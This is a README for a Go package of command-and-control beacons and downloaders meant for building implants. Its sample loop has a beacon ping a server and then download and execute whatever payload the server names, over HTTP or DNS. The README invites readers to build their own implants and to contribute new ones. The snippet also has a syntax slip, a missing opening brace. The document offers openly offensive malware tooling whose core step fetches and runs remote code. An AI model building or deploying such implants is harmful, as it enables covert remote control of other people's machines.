# C2
The C2 package provides beacons and downloaders that can be used in implants. The beacons and downloaders are designed to work together but can be used separately. The code below shows a sample work flow. You can find more detailed examples in the examples directory.

    beacon := beacon.NewBeacon()
    downloader := downloader.NewDownloader()

    for {
        str := beacon.Ping()

        if str != ""
            downloader.DownloadExec(str)
        }

        time.Sleep(sleep * time.Second)
    }

Each beacon must define a Ping() method, which returns a string that tells the DownloadExec() where to find the payload. If the Ping() method returns an empty string then DownloadExec() is not called.

## Creating Implants
The examples folder has two implants to use as a reference for building your own implants. The general idea is to select a beacon and a downloader and wrap them in a loop with some type of timing mechanism to control how often the implant will ping out.

## Creating Beacons and Downloaders
To create new beacons and downloaders you must build a struct that satisfies the appropriate interface. The beacon and downloader directories contain both HTTP and DNS based examples.

## Testing
The examples directory contains a DNS server and an HTTP server that can be used to test the various beacons and downloaders. There is also a test file in the beacon and downloader directories that can be used with the `go test` command to test the current beacons and downloaders.

## Contributions
I would love to have folks submit new beacons and downloaders. If you submit a new beacon or downloader also submit code or a written procedure that can be used to test the new method.
